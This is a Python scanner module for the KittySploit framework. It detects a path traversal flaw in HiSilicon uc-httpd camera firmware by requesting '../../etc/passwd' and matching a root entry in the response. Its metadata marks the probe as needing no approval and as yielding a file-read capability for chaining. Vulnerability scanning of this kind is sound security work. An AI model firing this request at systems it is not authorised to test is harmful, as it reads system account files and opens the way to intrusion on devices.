#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HiSilicon uc-httpd path traversal file read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HiSilicon uc-httpd - Path Traversal Detection',
        'description': (
            'Detects HiSilicon ASIC firmware path traversal by requesting ../../etc/passwd '
            'on uc-httpd servers.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'hisilicon', 'iot', 'camera', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2017/Feb/11',
        ],
    }

    def run(self):
        path = '../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or '', re.I):
            self.set_info(
                severity='high',
                reason='HiSilicon uc-httpd path traversal',
                path=path,
            )
            return True
        return False
